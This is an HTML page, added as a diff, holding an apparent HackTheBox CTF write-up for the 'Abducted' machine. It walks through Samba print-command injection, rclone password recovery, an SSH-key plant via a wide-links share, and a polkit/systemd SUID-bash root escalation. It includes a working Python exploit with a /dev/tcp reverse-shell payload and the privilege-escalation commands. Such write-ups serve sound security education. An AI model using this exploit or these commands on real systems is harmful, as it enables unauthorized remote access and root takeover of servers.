@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Case File — Abducted</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="case-file.css">
+<style>
+  .flag-redacted{
+    display:inline-block; vertical-align:middle;
+    height:15px; width:230px; max-width:60vw;
+    background: repeating-linear-gradient(90deg, var(--ink) 0 60%, transparent 0 100%);
+    background-color: var(--paper); background-size:14px 100%;
+    border-radius:2px; opacity:0.92;
+  }
+  .flag-row{display:flex;align-items:center;gap:10px;margin:10px 0;font-family:'IBM Plex Mono',monospace;font-size:0.85rem;}
+  .flag-label{color:var(--brass);text-transform:uppercase;letter-spacing:0.05em;font-size:0.72rem;min-width:64px;}
+  .machine-cover{
+    width:100%;
+    max-height:280px;
+    object-fit:cover;
+    border-radius:6px;
+    border:1px solid var(--panel-line);
+    box-shadow:0 14px 34px rgba(0,0,0,0.45);
+    margin-bottom:24px;
+    display:block;
+  }
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="../index.html" class="active">Dossier</a>
+  <a href="../case-files.html">Case Files</a>
+  <a href="../projects.html">Projects</a>
+  <a href="../blog.html">Blog</a>
+  <a href="../team.html">Team</a>
+  <a href="../contact.html">Contact</a>
+</nav>
+
+<div class="topbar">
+  <a class="back" href="../case-files.html">&larr; Back to Case Files</a>
+  <span class="case-no">FILE NO. 2026-116</span>
+</div>
+
+<main>
+  <img class="machine-cover" src="../assets/img/machines/abducted.png" alt="Abducted — HackTheBox machine cover">
+  <span class="file-tab">Medium · Linux</span>
+  <h1>Abducted</h1>
+  <div class="subtitle">HackTheBox</div>
+  <div class="tags">
+    <span class="tag">Samba Print Command Injection</span>
+    <span class="tag">rclone Credential Recovery</span>
+    <span class="tag">Polkit + systemd Privesc</span>
+  </div>
+
+  <div class="chain">
+    <span class="node">Samba Print RCE</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Backup Config Leak</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Share Misconfig Pivot</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Polkit systemd Drop-In</span>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">01</span><h2>Summary</h2></div>
+    <p>Abducted is a medium-difficulty Linux machine centered around a Samba file/print server. The exploitation chain involves:</p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>Unauthenticated RCE via <mark>CVE-2026-4480</mark> (Samba Print Command Injection)</li>
+      <li>Credential reuse from an rclone backup config</li>
+      <li>Samba misconfiguration (<code>force user</code> + <code>wide links</code>)</li>
+      <li>Polkit + systemd privilege escalation to <mark class="rust">root</mark></li>
+    </ul>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">02</span><h2>Enumeration</h2></div>
+    <pre><code>nmap -sC -sV -oN nmap/initial.txt &lt;TARGET_IP&gt;
+nmap -p- --min-rate 10000 &lt;TARGET_IP&gt;</code></pre>
+    <p><strong>Open Ports:</strong></p>
+    <pre><code>22/tcp → OpenSSH 9.6p1
+139/tcp &amp; 445/tcp → Samba 4</code></pre>
+    <pre><code>smbclient -L //&lt;TARGET_IP&gt; -N</code></pre>
+    <p><strong>Shares:</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li><code>HP-Reception</code> (Printer, Guest accessible)</li>
+      <li><code>projects</code></li>
+      <li><code>transfer</code></li>
+    </ul>
+    <div class="why"><strong>Why this mattered</strong>Guest-accessible printer shares on Samba are worth a second look — printing pipelines often shell out to an external command with job metadata baked in.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">03</span><h2>Initial Foothold — CVE-2026-4480 (Print Command Injection)</h2></div>
+    <p>The <code>HP-Reception</code> printer share has <code>print command = /usr/local/bin/printaudit %J %s</code>, where <code>%J</code> (job name) is <mark>not properly sanitized</mark>. Exploited using Samba's Python spoolss bindings.</p>
+    <p><strong>Exploit Script (exploit.py):</strong></p>
+    <pre><code>#!/usr/bin/env python3
+from samba.dcerpc import spoolss
+from samba.param import LoadParm
+from samba.credentials import Credentials
+import sys
+
+if len(sys.argv) != 4:
+    print(f"Usage: {sys.argv[0]} &lt;RHOST&gt; &lt;LHOST&gt; &lt;LPORT&gt;")
+    sys.exit(1)
+
+RHOST, LHOST, LPORT = sys.argv[1], sys.argv[2], int(sys.argv[3])
+
+DATA = (f"setsid bash -c 'bash -i >&amp; /dev/tcp/{LHOST}/{LPORT} 0>&amp;1' >/dev/null 2>&amp;1 &amp;\n").encode()
+
+lp = LoadParm(); lp.load_default()
+creds = Credentials(); creds.guess(lp); creds.set_anonymous()
+
+iface = spoolss.spoolss(rf"ncacn_np:{RHOST}[\pipe\spoolss]", lp, creds)
+h = iface.OpenPrinter(rf"\\{RHOST}\HP-Reception", "", spoolss.DevmodeContainer(), 0x00000008)
+
+i1 = spoolss.DocumentInfo1()
+i1.document_name = "|sh"
+i1.output_file = None
+i1.datatype = "RAW"
+ctr = spoolss.DocumentInfoCtr()
+ctr.level = 1
+ctr.info = i1
+
+iface.StartDocPrinter(h, ctr)
+iface.StartPagePrinter(h)
+iface.WritePrinter(h, DATA, len(DATA))
+iface.EndPagePrinter(h)
+iface.EndDocPrinter(h)
+iface.ClosePrinter(h)
+
+print("[+] Job submitted")</code></pre>
+    <p><strong>Usage:</strong></p>
+    <pre><code>nc -lvnp 4444
+python3 exploit.py &lt;TARGET_IP&gt; &lt;kali vpn&gt; 4444</code></pre>
+    <p>&rarr; Shell as <code>nobody</code></p>
+    <div class="why"><strong>Why this mattered</strong>Command-injection surface doesn't have to be a web form — anywhere a server-side process builds a shell command from client-controlled metadata (here, a print job's own name) is the same bug class.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">04</span><h2>User Flag (scott)</h2></div>
+    <pre><code>cat /opt/offsite-backup/rclone.conf</code></pre>
+    <pre><code>[offsite]
+type = sftp
+host = backup.hartley-group.internal
+user = svc-backup
+pass = &lt;obscured rclone secret&gt;</code></pre>
+    <p>Decode the <mark>obscured password</mark>:</p>
+    <pre><code>rclone reveal &lt;obscured rclone secret&gt;
+# Output: &lt;recovered plaintext password&gt;</code></pre>
+    <pre><code>ssh scott@&lt;TARGET_IP&gt;</code></pre>
+    <div class="flag-row"><span class="flag-label">User Flag</span><span class="flag-redacted"></span></div>
+    <div class="why"><strong>Why this mattered</strong>"Obscured" is not a security control — if the tool that wrote the secret can also read it back with a public flag, so can anyone who finds the config file.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">05</span><h2>Privilege Escalation — scott &rarr; marcus</h2></div>
+    <p>The <code>transfer</code> share is configured with:</p>
+    <pre><code>[transfer]
+   force user = marcus
+   wide links = yes</code></pre>
+    <p><strong>Exploit:</strong></p>
+    <pre><code>ssh-keygen -q -t ed25519 -N '' -f /tmp/k
+ln -s /home/marcus /srv/transfer/mh
+
+smbclient //127.0.0.1/transfer -U 'scott%&lt;recovered password&gt;' -c '
+mkdir mh/.ssh;
+put /tmp/k.pub mh/.ssh/authorized_keys
+'
+
+ssh -i /tmp/k marcus@127.0.0.1</code></pre>
+    <p>Now we are <code>marcus</code> (member of <code>operators</code> group).</p>
+    <div class="why"><strong>Why this mattered</strong><code>wide links</code> is one of the more dangerous Samba options still seen in the wild — combined with a forced service user, it turns "write access to a share" into "write access anywhere that user can reach."</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">06</span><h2>Root Privilege Escalation</h2></div>
+    <p>The <code>operators</code> group has polkit permission to reload systemd (<code>org.freedesktop.systemd1.reload-daemon</code>). The directory <code>/etc/systemd/system/smbd.service.d/</code> is <mark class="rust">group-writable</mark> (<code>drwxrws---</code>).</p>
+    <p>Create systemd drop-in:</p>
+    <pre><code>cat > /etc/systemd/system/smbd.service.d/override.conf &lt;&lt;'EOF'
+[Service]
+ExecStartPre=/bin/cp /bin/bash /tmp/.rb
+ExecStartPre=/bin/chmod 4755 /tmp/.rb
+EOF
+
+systemctl daemon-reload
+systemctl restart smbd</code></pre>
+    <p>Get root:</p>
+    <pre><code>/tmp/.rb -p -c 'id; cat /root/root.txt'</code></pre>
+    <div class="flag-row"><span class="flag-label">Root Flag</span><span class="flag-redacted"></span></div>
+    <div class="why"><strong>Why this mattered</strong>Polkit rules are frequently scoped too broadly — "can reload a specific service" quietly becomes "can run arbitrary root commands" the moment the matching unit's config directory is writable by the same group.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">07</span><h2>Key Lessons</h2></div>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>Always enumerate printer shares carefully — they can be dangerous.</li>
+      <li>rclone obscured passwords are <mark>trivial to reveal</mark>.</li>
+      <li><code>force user</code> + <code>wide links</code> is a <mark class="rust">dangerous combination</mark>.</li>
+      <li>Polkit delegations + writable systemd drop-in directories = easy root.</li>
+    </ul>
+  </div>
+</main>
+
+<footer>
+  <a href="mailto:burritosec51@gmail.com">burritosec51@gmail.com</a>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  hljs.configure({ languages: ["bash","shell","powershell","python","json","yaml","sql","xml","ini","javascript","php"] });
+  document.querySelectorAll("pre code").forEach((block) => { hljs.highlightElement(block); });
+</script>
+</body>
+</html>
